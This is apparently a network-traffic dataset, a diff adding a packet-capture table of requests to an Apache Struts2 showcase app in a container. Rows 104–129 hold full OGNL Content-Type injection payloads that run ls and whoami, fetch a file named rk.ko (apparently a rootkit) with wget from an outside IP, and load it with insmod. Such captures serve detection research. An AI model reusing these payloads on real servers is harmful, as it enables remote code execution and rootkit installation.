@@ -1,0 +1,131 @@
+	timestamp	length	highest_layer	host_ip	dest_ip	host_port	dest_port	http_req_uri	content-type
+0	1521394900.952944	766	HTTP	10.0.2.2	172.17.0.2	55952	8080	/j	
+1	1521394901.056015	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/html;charset=ISO-8859-1
+2	1521394901.081545	703	HTTP	10.0.2.2	172.17.0.2	55952	8080	/struts/utils.js	
+3	1521394901.083876	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/javascript
+4	1521394903.605212	765	HTTP	10.0.2.2	172.17.0.2	55952	8080	/	
+5	1521394903.606702	211	HTTP	172.17.0.2	10.0.2.2	8080	55952		text/html
+6	1521394903.610774	780	HTTP	10.0.2.2	172.17.0.2	55952	8080	/showcase.action	
+7	1521394903.649155	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/html;charset=ISO-8859-1
+8	1521394903.678907	717	HTTP	10.0.2.2	172.17.0.2	55952	8080	/struts/utils.js	
+9	1521394903.680853	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/javascript
+10	1521394906.801015	854	HTTP	10.0.2.2	172.17.0.2	55952	8080	/actionchaining/actionChain1!input.action	
+11	1521394907.455466	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/html;charset=ISO-8859-1
+12	1521394912.048495	851	HTTP	10.0.2.2	172.17.0.2	55952	8080	/tags/ui/actionTagExample!input.action	
+13	1521394912.411073	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/html;charset=ISO-8859-1
+14	1521394912.431239	762	HTTP	10.0.2.2	172.17.0.2	55952	8080	/struts/xhtml/styles.css	
+15	1521394912.432486	739	HTTP	10.0.2.2	172.17.0.2	55959	8080	/struts/utils.js	
+16	1521394912.4345	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/css
+17	1521394912.441323	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55959		text/javascript
+18	1521394916.704589	838	HTTP	10.0.2.2	172.17.0.2	55959	8080	/integration/editGangster	
+19	1521394917.598533	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55959		text/html;charset=ISO-8859-1
+20	1521394917.615981	749	HTTP	10.0.2.2	172.17.0.2	55959	8080	/struts/xhtml/styles.css	
+21	1521394917.615989	726	HTTP	10.0.2.2	172.17.0.2	55952	8080	/struts/utils.js	
+22	1521394917.625069	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55952		text/javascript
+23	1521394917.632467	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55959		text/css
+24	1521394922.304678	843	HTTP	10.0.2.2	172.17.0.2	55959	8080	/hangman/hangmanNonAjax.action	
+25	1521394922.775065	778	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/hangman.png	
+26	1521394922.789445	4132	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+27	1521394922.792394	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/Chalkboard_5.png	
+28	1521394922.798007	1542	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+29	1521394922.80148	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/guesses-left.png	
+30	1521394922.806881	2654	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+31	1521394922.809691	781	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/scaffold_5.png	
+32	1521394922.814667	776	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/guess.png	
+33	1521394922.814669	793	HTTP	10.0.2.2	172.17.0.2	55968	8080	/hangman/images/Chalkboard_underscroll.png	
+34	1521394922.814672	777	HTTP	10.0.2.2	172.17.0.2	55970	8080	/hangman/images/choose.png	
+35	1521394922.815145	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_A.png	
+36	1521394922.82085	1392	PNG	172.17.0.2	10.0.2.2	8080	55968		image/png
+37	1521394922.822303	3182	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+38	1521394922.823073	783	HTTP	10.0.2.2	172.17.0.2	55968	8080	/hangman/images/Chalkboard_B.png	
+39	1521394922.824984	783	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/Chalkboard_C.png	
+40	1521394922.835772	3603	PNG	172.17.0.2	10.0.2.2	8080	55970		image/png
+41	1521394922.838202	783	HTTP	10.0.2.2	172.17.0.2	55970	8080	/hangman/images/Chalkboard_D.png	
+42	1521394922.876248	1673	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+43	1521394922.877706	4549	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+44	1521394922.878182	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_I.png	
+45	1521394922.880002	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/Chalkboard_K.png	
+46	1521394922.886321	1713	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+47	1521394922.888104	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/Chalkboard_M.png	
+48	1521394922.888792	1742	PNG	172.17.0.2	10.0.2.2	8080	55968		image/png
+49	1521394922.890844	783	HTTP	10.0.2.2	172.17.0.2	55968	8080	/hangman/images/Chalkboard_N.png	
+50	1521394922.899336	1701	PNG	172.17.0.2	10.0.2.2	8080	55968		image/png
+51	1521394922.902633	783	HTTP	10.0.2.2	172.17.0.2	55968	8080	/hangman/images/Chalkboard_Q.png	
+52	1521394922.906764	1635	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+53	1521394922.908712	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/Chalkboard_P.png	
+54	1521394922.912347	1553	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+55	1521394922.914611	783	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/Chalkboard_F.png	
+56	1521394922.921132	1702	PNG	172.17.0.2	10.0.2.2	8080	55970		image/png
+57	1521394922.923145	783	HTTP	10.0.2.2	172.17.0.2	55970	8080	/hangman/images/Chalkboard_T.png	
+58	1521394922.923502	1578	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+59	1521394922.925232	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_X.png	
+60	1521394922.936488	1653	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+61	1521394922.939384	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/Chalkboard_Y.png	
+62	1521394922.944562	1679	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+63	1521394922.946796	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_O.png	
+64	1521394922.967698	1694	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+65	1521394922.970352	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_R.png	
+66	1521394922.973401	1566	PNG	172.17.0.2	10.0.2.2	8080	55970		image/png
+67	1521394922.975219	783	HTTP	10.0.2.2	172.17.0.2	55970	8080	/hangman/images/Chalkboard_G.png	
+68	1521394922.97665	1728	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+69	1521394922.978683	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_E.png	
+70	1521394922.979161	1552	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+71	1521394922.981173	783	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/Chalkboard_S.png	
+72	1521394922.986969	1675	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+73	1521394922.988962	783	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/Chalkboard_Z.png	
+74	1521394922.99321	1645	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+75	1521394922.995191	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_V.png	
+76	1521394922.996684	1635	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+77	1521394922.998694	783	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/Chalkboard_H.png	
+78	1521394923.002779	1604	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+79	1521394923.005131	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_J.png	
+80	1521394923.009776	1507	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+81	1521394923.011643	783	HTTP	10.0.2.2	172.17.0.2	55972	8080	/hangman/images/Chalkboard_U.png	
+82	1521394923.016672	1592	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+83	1521394923.018782	783	HTTP	10.0.2.2	172.17.0.2	55966	8080	/hangman/images/Chalkboard_L.png	
+84	1521394923.039334	1600	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+85	1521394923.042146	783	HTTP	10.0.2.2	172.17.0.2	55952	8080	/hangman/images/Chalkboard_W.png	
+86	1521394923.043606	1659	PNG	172.17.0.2	10.0.2.2	8080	55972		image/png
+87	1521394923.050232	1722	PNG	172.17.0.2	10.0.2.2	8080	55952		image/png
+88	1521394923.052156	1756	PNG	172.17.0.2	10.0.2.2	8080	55968		image/png
+89	1521394923.054184	1650	PNG	172.17.0.2	10.0.2.2	8080	55970		image/png
+90	1521394923.061624	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55959		text/html;charset=UTF-8
+91	1521394923.069116	1534	PNG	172.17.0.2	10.0.2.2	8080	55966		image/png
+92	1521394927.154014	859	HTTP	10.0.2.2	172.17.0.2	55966	8080	/freemarker/customFreemarkerManagerDemo.action	
+93	1521394927.265234	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55966		text/html;charset=UTF-8
+94	1521394928.43434	979	HTTP	10.0.2.2	172.17.0.2	55966	8080	/viewSource.action?config=&className=com.opensymphony.xwork2.ActionSupport&page=/freemarker//freemarker/customFreemarkerManagerUsage.ftl	
+95	1521394928.510017	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55966		text/html;charset=ISO-8859-1
+96	1521394933.86599	812	HTTP	10.0.2.2	172.17.0.2	55966	8080	/showcase.jsp	
+97	1521394933.919997	714	HTTP	10.0.2.2	172.17.0.2	55959	8080	/struts/utils.js	
+98	1521394933.921927	59	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55959		text/javascript
+99	1521394933.923712	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55966		text/html;charset=ISO-8859-1
+100	1521394938.008579	841	HTTP	10.0.2.2	172.17.0.2	55966	8080	/freemarker/standardTags.action	
+101	1521394938.615525	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55966		text/html;charset=UTF-8
+102	1521394942.042459	968	HTTP	10.0.2.2	172.17.0.2	55966	8080	/viewSource.action?config=&className=org.apache.struts2.showcase.freemarker.StandardTagsAction&page=/freemarker//freemarker/standardTags.ftl	
+103	1521394942.143351	459	DATA-TEXT-LINES	172.17.0.2	10.0.2.2	8080	55966		text/html;charset=ISO-8859-1
+104	1521394990.853758	358	HTTP	172.17.0.1	172.17.0.2	44126	8080	/showcase.action	".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
+105	1521394990.951015	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	44126		text/html;charset=ISO-8859-1
+106	1521394995.81916	358	HTTP	172.17.0.1	172.17.0.2	39926	8080	/showcase.action	".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
+107	1521394995.907189	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	39926		text/html;charset=ISO-8859-1
+108	1521395000.997805	358	HTTP	172.17.0.1	172.17.0.2	48404	8080	/showcase.action	".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
+109	1521395001.047197	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	48404		text/html;charset=ISO-8859-1
+110	1521395031.895408	969	URLENCODED-FORM	172.17.0.1	172.17.0.2	56412	8080	/integration/saveGangster.action	application/x-www-form-urlencoded
+111	1521395031.95592	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	56412		text/html;charset=ISO-8859-1
+112	1521395034.210954	969	URLENCODED-FORM	172.17.0.1	172.17.0.2	60510	8080	/integration/saveGangster.action	application/x-www-form-urlencoded
+113	1521395034.295152	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	60510		text/html;charset=ISO-8859-1
+114	1521395037.038065	974	URLENCODED-FORM	172.17.0.1	172.17.0.2	55308	8080	/integration/saveGangster.action	application/x-www-form-urlencoded
+115	1521395037.116765	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	55308		text/html;charset=ISO-8859-1
+116	1521395046.664477	979	URLENCODED-FORM	172.17.0.1	172.17.0.2	36782	8080	/integration/saveGangster.action	application/x-www-form-urlencoded
+117	1521395046.744679	471	DATA-TEXT-LINES	172.17.0.2	172.17.0.1	8080	36782		text/html;charset=ISO-8859-1
+118	1521395061.490042	1020	HTTP	172.17.0.1	172.17.0.2	53886	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+119	1521395073.060337	1024	HTTP	172.17.0.1	172.17.0.2	34322	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+120	1521395109.142614	1059	HTTP	172.17.0.1	172.17.0.2	59796	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+121	1521395122.848523	1059	HTTP	172.17.0.1	172.17.0.2	55788	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+122	1521395122.87261	172	HTTP	172.17.0.2	162.212.156.148	34370	80	/rk.ko	
+123	1521395124.42335	59	HTTP	162.212.156.148	172.17.0.2	80	34370		
+124	1521395125.199485	58	HTTP	162.212.156.148	172.17.0.2	80	34370		
+125	1521395126.245068	56	HTTP	162.212.156.148	172.17.0.2	80	34370		
+126	1521395127.359595	56	HTTP	162.212.156.148	172.17.0.2	80	34370		
+127	1521395147.160066	1032	HTTP	172.17.0.1	172.17.0.2	55058	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+128	1521395162.837276	1032	HTTP	172.17.0.1	172.17.0.2	60130	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+129	1521395163.444769	1032	HTTP	172.17.0.1	172.17.0.2	54084	8080	/showcase.action	%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
